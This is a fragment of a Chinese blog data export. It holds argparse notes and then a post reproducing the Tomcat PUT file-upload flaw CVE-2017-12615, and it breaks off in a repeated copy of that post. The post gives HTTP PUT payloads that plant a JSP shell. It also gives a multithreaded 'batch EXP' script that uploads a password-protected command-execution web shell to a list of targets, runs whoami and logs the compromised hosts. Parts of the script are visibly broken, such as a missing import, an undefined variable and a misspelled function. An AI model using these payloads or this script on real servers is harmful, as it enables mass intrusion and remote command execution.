href=\"https://docs.python.org/3/library/argparse.html#the-add-argument-method\">add_argument()方法</a></h2><pre><code>ArgumentParser.add_argument(\n    name or flags...    # 选项的名称或列表,例如：foo/-f/--foo\n    [, action]      # 采取的基本操作\n                        store(默认)         存储参数值\n                        store_const        使用该字符串选项时，取用const值\n                        store_true         使用该字符串选项时，参数值置为True\n                        store_false        使用该字符串选项时，参数值置为False\n                        append             同一个命令行中多次使用该字符串选项时，以追加的方式将值添加到list中\n                        append_const       将多个字符串选项的const值合并到一个list\n                        count              统计选项出现的次数 （如：&quot;-vvv&quot;,则最终值为3）\n                        help               parser默认会添加一个help action。(一般不用理会)\n                        version            打印版本信息\n                        也可以自定义action类\n    [, nargs]       # 该参数值要求的数量\n                        数值       指明参数个数\n                        ?         提供了参数则取参数值；\n                                    无参数但声明了选项字符串则取const值；\n                                    无参数也未声明选择字符串则取default值\n                        *         所有参数存入list\n                        +         与*类似，但参数个数不能为空\n                        argparse.REMAINDER  原封不动的记录参数到list中，通常用于将这些参数传递到其它的命令行工具。\n    [, const]       # action/nargs部分要求的常值\n                        1、当action=&quot;store_const&quot;或者&quot;append_const&quot;时需要设置\n                        2、当选项为(-f/--foo),nargs=&apos;?&apos;，同时未提供具体参数时，取用该值。\n    [, default]     # 参数默认值\n    [, type]        # 参数类型（内建参数或者函数，也可是自定义函数）\n    [, choices]     # 允许的参数值（白名单）,tuple/range\n    [, required]    # 选项是否必须，设置为True表示选项必填。\n    [, help]        # 参数说明,可以用其它类似 %(prog)s 格式调用prog值；可设置argparse.SUPPRESS使该选项在帮助信息中不可见。\n    [, metavar]     # 定义参数在Usage信息中的名称\n    [, dest]        # 解析后的属性名称\n)\n</code></pre><ul>\n<li><h3 id=\"自定义action\"><a href=\"#自定义action\" class=\"headerlink\" title=\"自定义action\"></a><a href=\"https://docs.python.org/3/library/argparse.html#action-classes\">自定义action</a></h3><p>  class argparse.<strong>Action</strong>(option_strings, dest, nargs=None, const=None, default=None, type=None, choices=None, required=False, help=None, metavar=None)</p>\n</li>\n</ul>\n<h2 id=\"parse-args-方法\"><a href=\"#parse-args-方法\" class=\"headerlink\" title=\"parse_args()方法\"></a><a href=\"https://docs.python.org/3/library/argparse.html#the-parse-args-method\">parse_args()方法</a></h2><pre><code>ArgumentParser.parse_args(args=None, namespace=None)\n</code></pre><p>一般情况下，我们直接使用如下命令就可以了：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># args=None, 程序将sys.argv作为参数代入</span></div><div class=\"line\">args = parse.parse_args()              </div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 给args赋值，跳过sys.argv，主要用于测试工作，避免每次运行都输入冗长的参数。</span></div><div class=\"line\">args = parser.parse_args([<span class=\"string\">'1'</span>, <span class=\"string\">'2'</span>, <span class=\"string\">'3'</span>, <span class=\"string\">'4'</span>])</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># namespace=custom_class，将属性分配到一个已经存在的对象中。</span></div><div class=\"line\">parser.parse_args(args=[<span class=\"string\">'--foo'</span>, <span class=\"string\">'BAR'</span>], namespace=custom_class99)</div></pre></td></tr></table></figure></p>\n<h2 id=\"其它工具\"><a href=\"#其它工具\" class=\"headerlink\" title=\"其它工具\"></a><a href=\"https://docs.python.org/3/library/argparse.html#other-utilities\">其它工具</a></h2><ul>\n<li><h3 id=\"子命令\"><a href=\"#子命令\" class=\"headerlink\" title=\"子命令\"></a><a href=\"https://docs.python.org/3/library/argparse.html#sub-commands\">子命令</a></h3><p>  很多程序把它的功能分到几个子程序中，比如：pip install , pip download , pip uninstall 等. 通过这种方式，可以很方便处理不同程序的参数。</p>\n<p>  ArgumentParser.<strong>add_subparsers</strong>([title][, description][, prog][, parser_class][, action][, option_string][, dest][, help][, metavar])</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparsers = parser.add_subparsers(dest=<span class=\"string\">'subparser_name'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparser1 = subparsers.add_parser(<span class=\"string\">'1'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparser1.add_argument(<span class=\"string\">'-x'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparser2 = subparsers.add_parser(<span class=\"string\">'2'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparser2.add_argument(<span class=\"string\">'y'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([<span class=\"string\">'2'</span>, <span class=\"string\">'frobble'</span>])</div><div class=\"line\">Namespace(subparser_name=<span class=\"string\">'2'</span>, y=<span class=\"string\">'frobble'</span>)</div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"文件类型对象\"><a href=\"#文件类型对象\" class=\"headerlink\" title=\"文件类型对象\"></a><a href=\"https://docs.python.org/3/library/argparse.html#filetype-objects\">文件类型对象</a></h3><p>  add_argument()中的FileType的参数”工厂”。</p>\n<p>  class argparse.<strong>FileType</strong>(mode=’r’, bufsize=-1, encoding=None, errors=None)</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'--raw'</span>, type=argparse.FileType(<span class=\"string\">'wb'</span>, <span class=\"number\">0</span>))</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'out'</span>, type=argparse.FileType(<span class=\"string\">'w'</span>, encoding=<span class=\"string\">'UTF-8'</span>))</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([<span class=\"string\">'--raw'</span>, <span class=\"string\">'raw.dat'</span>, <span class=\"string\">'file.txt'</span>])</div><div class=\"line\">Namespace(out=&lt;_io.TextIOWrapper name=<span class=\"string\">'file.txt'</span> mode=<span class=\"string\">'w'</span> encoding=<span class=\"string\">'UTF-8'</span>&gt;, raw=&lt;_io.FileIO name=<span class=\"string\">'raw.dat'</span> mode=<span class=\"string\">'wb'</span>&gt;)</div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"参数分组\"><a href=\"#参数分组\" class=\"headerlink\" title=\"参数分组\"></a><a href=\"https://docs.python.org/3/library/argparse.html#argument-groups\">参数分组</a></h3><p>  在Usage信息中的参数分组，如pip -h可以看到”Commands”,”General Options”分组。</p>\n<p>  ArgumentParser.<strong>add_argument_group</strong>(title=None, description=None)</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser(prog=<span class=\"string\">'testPROG'</span>, add_help=<span class=\"keyword\">False</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group1 = parser.add_argument_group(<span class=\"string\">'group1'</span>, <span class=\"string\">'group1 description'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group1.add_argument(<span class=\"string\">'foo'</span>, help=<span class=\"string\">'foo help'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group2 = parser.add_argument_group(<span class=\"string\">'group2'</span>, <span class=\"string\">'group2 description'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group2.add_argument(<span class=\"string\">'--bar'</span>, help=<span class=\"string\">'bar help'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.print_help()</div><div class=\"line\"></div><div class=\"line\">usage: testPROG [--bar BAR] foo</div><div class=\"line\"></div><div class=\"line\">group1:</div><div class=\"line\">group1 description</div><div class=\"line\"></div><div class=\"line\">foo    foo help</div><div class=\"line\"></div><div class=\"line\">group2:</div><div class=\"line\">group2 description</div><div class=\"line\"></div><div class=\"line\">--bar BAR  bar help</div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"互斥\"><a href=\"#互斥\" class=\"headerlink\" title=\"互斥\"></a><a href=\"https://docs.python.org/3/library/argparse.html#mutual-exclusion\">互斥</a></h3><p>  参数互斥！</p>\n<p>  ArgumentParser.<strong>add_mutually_exclusive_group</strong>(required=False)</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser(prog=<span class=\"string\">'PROG'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group = parser.add_mutually_exclusive_group(required=<span class=\"keyword\">True</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group.add_argument(<span class=\"string\">'--foo'</span>, action=<span class=\"string\">'store_true'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group.add_argument(<span class=\"string\">'--bar'</span>, action=<span class=\"string\">'store_false'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([])</div><div class=\"line\">usage: PROG [-h] (--foo | --bar)</div><div class=\"line\">PROG: error: one of the arguments --foo --bar <span class=\"keyword\">is</span> required</div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"解析器默认配置\"><a href=\"#解析器默认配置\" class=\"headerlink\" title=\"解析器默认配置\"></a><a href=\"https://docs.python.org/3/library/argparse.html#parser-defaults\">解析器默认配置</a></h3><p>  在解析器级别给参数设置默认值(优先级高于在add_argument方法中的设置)，也可以获取默认值。</p>\n<p>  ArgumentParser.<strong>set_defaults</strong>(**kwargs)       # 设置默认值</p>\n<p>  ArgumentParser.<strong>get_default</strong>(dest)            # 获取默认值</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'foo'</span>, type=int)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.set_defaults(bar=<span class=\"number\">42</span>, baz=<span class=\"string\">'badger'</span>)   <span class=\"comment\"># 不审查是否在命令行中声明，故而bar，baz可以直接添加</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([<span class=\"string\">'736'</span>])</div><div class=\"line\">Namespace(bar=<span class=\"number\">42</span>, baz=<span class=\"string\">'badger'</span>, foo=<span class=\"number\">736</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'--foo'</span>, default=<span class=\"string\">'bar'</span>) <span class=\"comment\"># 解析器级别默认值总是覆盖参数级别默认值</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.set_defaults(foo=<span class=\"string\">'spam'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([])</div><div class=\"line\">Namespace(foo=<span class=\"string\">'spam'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'--foo'</span>, default=<span class=\"string\">'badger'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.get_default(<span class=\"string\">'foo'</span>)                   <span class=\"comment\"># 获取默认值</span></div><div class=\"line\"><span class=\"string\">'badger'</span></div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"打印帮忙\"><a href=\"#打印帮忙\" class=\"headerlink\" title=\"打印帮忙\"></a><a href=\"https://docs.python.org/3/library/argparse.html#printing-help\">打印帮忙</a></h3><p>  用于打印帮助信息。</p>\n<p>  ArgumentParser.<strong>print_usage</strong>(file=None)</p>\n<p>  ArgumentParser.<strong>print_help</strong>(file=None)</p>\n<p>  ArgumentParser.<strong>format_usage</strong>()</p>\n<p>  ArgumentParser.<strong>format_help</strong>()</p>\n</li>\n<li><h3 id=\"部分解析\"><a href=\"#部分解析\" class=\"headerlink\" title=\"部分解析\"></a><a href=\"https://docs.python.org/3/library/argparse.html#partial-parsing\">部分解析</a></h3><p>  有些脚本只解析部分参数，放过其余的参数以便传递给其它脚本或程序。 这种情况下使用 parse_known_args() 。跟parse_args()用法一样，但当参数过多的情况下并不会报错，而是将多余的参数放到一个新的tuple中。</p>\n<p>  ArgumentParser.<strong>parse_known_args</strong>(args=None, namespace=None)</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'--foo'</span>, action=<span class=\"string\">'store_true'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'bar'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_known_args([<span class=\"string\">'--foo'</span>, <span class=\"string\">'--badger'</span>, <span class=\"string\">'BAR'</span>, <span class=\"string\">'spam'</span>])</div><div class=\"line\">(Namespace(bar=<span class=\"string\">'BAR'</span>, foo=<span class=\"keyword\">True</span>), [<span class=\"string\">'--badger'</span>, <span class=\"string\">'spam'</span>])     <span class=\"comment\"># ['--badger', 'spam']即为多余的参数。</span></div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"自定义文件解析\"><a href=\"#自定义文件解析\" class=\"headerlink\" title=\"自定义文件解析\"></a><a href=\"https://docs.python.org/3/library/argparse.html#customizing-file-parsing\">自定义文件解析</a></h3></li>\n<li><h3 id=\"退出方法\"><a href=\"#退出方法\" class=\"headerlink\" title=\"退出方法\"></a><a href=\"https://docs.python.org/3/library/argparse.html#exiting-methods\">退出方法</a></h3></li>\n<li><h3 id=\"optparse代码升级\"><a href=\"#optparse代码升级\" class=\"headerlink\" title=\"optparse代码升级\"></a><a href=\"https://docs.python.org/3/library/argparse.html#upgrading-optparse-code\">optparse代码升级</a></h3><p>  原本argparse是与optparse保持兼容的，但是！@#￥%……&amp;*（。升级办法如下：</p>\n</li>\n</ul>\n<ol>\n<li>Replace all optparse.OptionParser.add_option() calls with ArgumentParser.add_argument() calls.</li>\n<li>Replace (options, args) = parser.parse_args() with args = parser.parse_args() and add additional ArgumentParser.add_argument() calls for the positional arguments. Keep in mind that what was previously called options, now in argparse context is called args.</li>\n<li>Replace callback actions and the callback_* keyword arguments with type or action arguments.</li>\n<li>Replace string names for type keyword arguments with the corresponding type objects (e.g. int, float, complex, etc).</li>\n<li>Replace optparse.Values with Namespace and optparse.OptionError and optparse.OptionValueError with ArgumentError.</li>\n<li>Replace strings with implicit arguments such as %default or %prog with the standard Python syntax to use dictionaries to format strings, that is, %(default)s and %(prog)s.</li>\n<li>Replace the OptionParser constructor version argument with a call to parser.add_argument(‘–version’, action=’version’, version=’<the version=\"\">‘).</the></li>\n</ol>"},{"title":"Tomcat文件上传(CVE-2017-12615)复现(可攻击7.0.81 & 带POC)","date":"2017-09-20T03:01:08.000Z","_content":"## 漏洞概述\n**远程代码执行漏洞（CVE-2017-12615）    影响： Apache Tomcat 7.0.0 - 7.0.79（7.0.81修复不完全）**\n\n当 Tomcat 启用了 HTTP PUT 请求方法（将web.xml文件中 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 jsp 文件。之后，jsp 文件中的代码将能被服务器执行。\n\n<!-- more -->\n## 基本信息\n漏洞名称：Tomcat任意文件上传漏洞\n\n漏洞编号：CVE-2017-12615\n\n漏洞影响：上传包含任意代码的文件，并被服务器执行。\n\n影响平台：Windows/Linux\n\n影响版本：Apache Tomcat <= 7.0.81 | Apache Tomcat <= 8.5.20 | Apache Tomcat <= 9.0.0.M26\n\n## 原理分析\n本漏洞涉及到 DefaultServlet和 JspServlet，DefaultServlet的作用是处理静态文件 ，JspServlet 的作用是处理jsp 与jspx 文件的请求，同时DefaultServlet 可以处理 PUT 或 DELETE请求。\n\n除了jsp和jspx默认是由org.apache.jasper.servlet.JspServlet处理，其他默认都是由org.apache.catalina.servlets.DefaultServlet来处理。\n\n即使设置readonly为false，默认tomcat也不允许PUT上传jsp和jspx文件的，因为后端都用org.apache.jasper.servlet.JspServlet来处理jsp或是jspx后缀的请求了，而JspServlet中没有PUT上传的逻辑，PUT的代码实现只存在于DefaultServlet中。\n\n这个漏洞的根本是通过构造特殊后缀名，绕过了tomcat检测，让它用DefaultServlet的逻辑去处理请求，从而上传jsp文件。\n\n目前主要三种方法：\n\nl evil.jsp%20\n\nl evil.jsp::$DATA\n\nl evil.jsp/\n\n\n## 复现过程\n- ### 0x00 安装Tomcat 7.0.79\n![img](Tomcat文件上传-CVE-2017-12615-复现/ScreenShot01.png)\n\n- ### 0x01 开启HTTP PUT\n\n修改Tomcat 7.0/conf/web.xml文件\n添加readonly属性，使者readonly=false.\n```xml\n    <servlet>\n        <servlet-name>default</servlet-name>\n        <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>\n        <init-param>\n            <param-name>debug</param-name>\n            <param-value>0</param-value>\n        </init-param>\n        <init-param>\n            <param-name>listings</param-name>\n            <param-value>false</param-value>\n        </init-param>\n        <init-param>\n            <param-name>readonly</param-name>\n            <param-value>false</param-value>\n        </init-param>\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n```\n然后，重启Tomcat。\n\n- ### 0x02 任意文件上传 · 姿势一\n思路：参考微软MSDN上关于NTFS Streams的一段资料[https://msdn.microsoft.com/en-us/library/dn393272.aspx](https://msdn.microsoft.com/en-us/library/dn393272.aspx)\n```\nAll files on an NTFS volume consist of at least one stream - the main stream – this is the normal, viewable file in which data is stored. The full name of a stream is of the form below.\n\n    <filename>:<stream name>:<stream type>\n\nThe default data stream has no name. That is, the fully qualified name for the default stream for a file called \"sample.txt\" is \"sample.txt::$DATA\" since \"sample.txt\" is the name of the file and \"$DATA\" is the stream type.\n```\n\npayload ::\n```\nPUT /111.jsp::$DATA HTTP/1.1\nHost: 10.1.1.6:8080\nUser-Agent: JNTASS\nDNT: 1\nConnection: close\n\n...jsp shell...\n```\n![img](Tomcat文件上传-CVE-2017-12615-复现/ScreenShot02.png)\n写入成功！\n\n- ### 0x03 任意文件上传 · 姿势二 （可攻击Tomcat 7.0.81）\n\n思路：可以上传jSp文件(但不能解析)，却不可上传jsp。 说明tomcat对jsp是做了一定处理的。那么就考虑是否可以使其处理过程中对文件名的识别存在差异性，前面的流程中 test.jsp/ 识别为非jsp文件，而后续保存文件的时候，文件名不接受/字符，故而忽略掉。\n\npayload ::\n```\nPUT /222.jsp/ HTTP/1.1\nHost: 10.1.1.6:8080\nUser-Agent: JNTASS\nDNT: 1\nConnection: close\n\n...jsp shell...\n```\n![img](Tomcat文件上传-CVE-2017-12615-复现/ScreenShot06.png)\n写入成功！\n\n- ### 0x04 菜刀连接\n\n![img](Tomcat文件上传-CVE-2017-12615-复现/ScreenShot04.png)\n\n\n## 批量EXP脚本\n```python\n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport argparse\nimport requests\nimport sys\nimport time\nimport threading\nimport queue\nimport re\nfrom lxml import html\n\nclass Attacker(object):\n    def __init__(self,urlList,threads,output):\n        self.urlList=urlList\n        self.threads=threads\n        self.optput=output\n        self.print_lock=threading.Lock()\n        self.savaFile_lock=threading.Lock()\n\n    def run_thread(self):\n        thread_arr=[]\n        for i in range(self.threads):\n            t=threading.Thread(target=self.attack)\n            thread_arr.append(t)\n        for i in range(self.threads):\n            thread_arr[i].start()\n        for i in range(self.threads):\n            thread_arr[i].join()\n    def saveResultToFile(self,message):\n        if self.optput is not None:\n            with open(self.optput, 'a+', encoding = 'utf8') as f:  # 以追加的方法结果写入文件\n                f.write(message[0]+\"\\t\")\n                f.write(message[1]+\"\\n\")\n\n    def attack(self):\n        body = '''<%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp\n        +\"\\\\n\");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if(\"W3akPassw0rd\".equals(request.getParameter(\"pwd\"))&&!\"\".equals(request.getParameter(\"cmd\"))){out.println(\"<pre>\"+excuteCmd(request.getParameter(\"cmd\"))+\"</pre>\");}else{out.println(\":-)\");}%>'''\n\n        while not self.urlList.empty():\n\n            url=self.urlList.get()\n            protocol=re.search(r\"(https?)\\:\\/\\/(.*?)\\/\",url+\"/\").group(1)\n            host=re.search(r\"(https?)\\:\\/\\/(.*?)\\/\",url+\"/\").group(2)\n            self.print_lock.acquire()\n            print(\" \\b\\b\"*100,end=\"\")\n            print(\"\\r[about \"+str(self.urlList.qsize())+\" left]\\t\"+\"trying attack :: \"+protocol+\"://\"+host,end=\"\")\n            self.print_lock.release()\n            try:\n\n                req = requests.options(url=protocol+\"://\"+host+\"/b4acde76d8daf7a7b3b55670ed4f245c\",timeout=10)\n                if 'allow' in req.headers and req.headers['allow'].find(\"PUT\")>0 :\n                    uploadevil=requests.put(url=protocol+\"://\"+host+\"/b4acde76d8daf7a7b3b55670ed4f245c.jsp/\",data=body,timeout=10)\n                    if (uploadevil.status_code == 201) or (uploadevil.status_code == 204):\n                        execWhoami=requests.get(url=protocol+\"://\"+host+\"/b4acde76d8daf7a7b3b55670ed4f245c.jsp?pwd=W3akPassw0rd&cmd=whoami\",timeout=10)\n                        #print(execWhoami.text)\n                        #whoami=re.search(r\"<pre>(.*)<\\/pre>\",execWhoami.text).group(1)\n                        whoami=html.fromstring(execWhoami.text).text_content()\n                        self.print_lock.acquire()\n                        print(\" \\b\\b\"*100,end=\"\")\n                        print(\"\\r🍻   \"+protocol+\"://\"+host+\"/b4acde76d8daf7a7b3b55670ed4f245c.jsp?pwd=W3akPassw0rd&cmd=whoami\\t\"+whoami)\n                        if self.optput is not None:\n                            self.saveResultToFile((protocol+\"://\"+host+\"/b4acde76d8daf7a7b3b55670ed4f245c.jsp\",whoami))\n                        self.print_lock.release()\n                    \n                    else:\n                        pass\n                else:\n                    pass\n            except:\n                pass\n                #self.print_lock.acquire()\n                #print(\"\\tFailed...   Next...\")\n                #self.print_lock.release()\n        print(\" \\b\\b\"*100,end=\"\")\n\ndef readUrls(listFile):\n    fd=open(listFile,\"rb\")\n    lines=fd.readlines()\n    fd.close()\n\n    urlList=queue.Queue()\n\n    for url in lines:\n        urlList.put(url.decode(\"ascii\"))\n    return urlList\n\ndef main():\n    headCharPic=\"\\r        .--.\\n       |o_o |    ------------------ \\n       |:_/ |   < Author: Mr.Bingo >\\n      //   \\ \\   ------------------ \\n     (|     | ) <    oddboy.cn     >\\n    /'\\_   _/`\\  ------------------\\n    \\___)=(___/\\n\"\n    print(headCharPic)\n    # Creating a parser\n    parser=argparse.ArgumentParser()\n\n    groupUser = parser.add_mutually_exclusive_group(required=True)\n    groupUser.add_argument('-u',dest=\"url\",help=\"target url\")\n    groupUser.add_argument('-U',dest='urlFile',help=\"url list file\")\n    parser.add_argument('-t',dest=\"threads\",default=1,type=int,help=\"threads\")\n    parser.add_argument('-o',dest=\"outFile\",help=\"output results\")\n\n    args=parser.parse_args()\n\n    if args.urlFile is not None:\n        urlList=readUrls(args.urlFile)\n    else:\n        urlList=queue.Queue()\n        urlList.put(args.url)\n    if args.outFile is not None:\n        filePath,fileName=os.path.split(fileFullPath)\n        if (filePath!=\"\") and (not os.path.exists(filePath)):\n            os.mikedirs(filePath)   # 若不存在这个目录则递归创建\n    \n    Attacker_obj=Attacker(urlList,args.threads,args.outFile)\n    Attacker_obj.run_thread()\n\nif __name__ == '__main__':\n    main()\n    print(\"\\n@@@   Done   @@@\")\n```\n![img](Tomcat文件上传-CVE-2017-12615-复现/ScreenShot05.png)\n\n## 漏洞总结\n\n该漏洞利用的前提条件需要手动开启readOnly功能，以支持上传操作，默认配置的情况下是无法成功利用漏洞，从实际测试来看，漏洞危害性并没有那么高。但是如果用户一旦启用了readOnly功能，黑客可利用漏洞成功入侵。\n\n根据业务评估配置conf/webxml文件的readOnly值为Ture或注释参数，禁用PUT方法并重启tomcat服务，临时规避安全风险；\n注意： 如果禁用PUT方法，对于依赖PUT方法的应用，可能导致业务失效。\n\n\n## 参考链接\n\n- [NTFS Streams | https://msdn.microsoft.com/en-us/library/dn393272.aspx](https://msdn.microsoft.com/en-us/library/dn393272.aspx)\n- [http://tomcat.apache.org/security-7.html#Fixed_in_Apache_Tomcat_7.0.81](http://tomcat.apache.org/security-7.html#Fixed_in_Apache_Tomcat_7.0.81)\n\n- [Tomcat信息泄漏和远程代码执行漏洞分析报告（CVE-2017-12615/CVE-2017-12616）](https://mp.weixin.qq.com/s/wWkb079hUYOwDgVQqEqGZQ)","source":"_posts/Tomcat文件上传-CVE-2017-12615-复现.md","raw":"---\ntitle: Tomcat文件上传(CVE-2017-12615)复现(可攻击7.0.81 & 带POC)\ndate: 2017-09-20 11:01:08\ntags: [文件上传,tomcat]\n---\n## 漏洞概述\n**远程代码执行漏洞（CVE-2017-12615）    影响： Apache Tomcat 7.0.0 - 7.0.79（7.0.81修复不完全）**\n\n当 Tomcat 启用了 HTTP PUT 请求方法（将web.xml文件中 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 jsp 文件。之后，jsp 文件中的代码将能被服务器执行。\n\n<!-- more -->\n## 基本信息\n漏洞名称：Tomcat任意文件上传漏洞\n\n漏洞编号：CVE-2017-12615\n\n漏洞影响：上传包含任意代码的文件，并被服务器执行。\n\n影响平台：Windows/Linux\n\n影响版本：Apache Tomcat <= 7.0.81 | Apache Tomcat <= 8.5.20 | Apache Tomcat <= 9.0.0.M26\n\n## 原理分析\n本漏洞涉及到 DefaultServlet和 JspServlet，DefaultServlet的作用是处理静态文件 ，JspServlet 的作用是处理jsp 与jspx 文件的请求，同时DefaultServlet 可以处理 PUT 或 DELETE请求。\n\n除了jsp和jspx默认是由org.apache.jasper.servlet.JspServlet处理，其他默认都是由org.apache.catalina.servlets.DefaultServlet来处理。\n\n即使设置readonly为false，默认tomcat也不允许PUT上传jsp和jspx文件的，因为后端都用org.apache.jasper.servlet.JspServlet来处理jsp或是jspx后缀的请求了，而JspServlet中没有PUT上传的逻辑，PUT的代码实现只存在于DefaultServlet中。\n\n这个漏洞的根本是通过构造特殊后缀名，绕过了tomcat检测，让它用DefaultServlet的逻辑去处理请求，从而上传jsp文件。\n\n目前主要三种方法：\n\nl evil.jsp%20\n\nl evil.jsp::$DATA\n\nl evil.jsp/\n\n\n## 复现过程\n- ### 0x00 安装Tomcat 7.0.79\n![img](Tomcat文件上传-CVE-2017-12615-复现/ScreenShot01.png)\n\n- ### 0x01 开启HTTP PUT\n\n修改Tomcat 7.0/conf/web.xml文件\n添加readonly属性，使者readonly=false.\n```xml\n    <servlet>\n        <servlet-name>default</servlet-name>\n        <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>\n        <init-param>\n            <param-name>debug</param-name>\n            <param-value>0</param-value>\n        </init-param>\n        <init-param>\n            <param-name>listings</param-name>\n            <param-value>false</param-value>\n        </init-param>\n        <init-param>\n            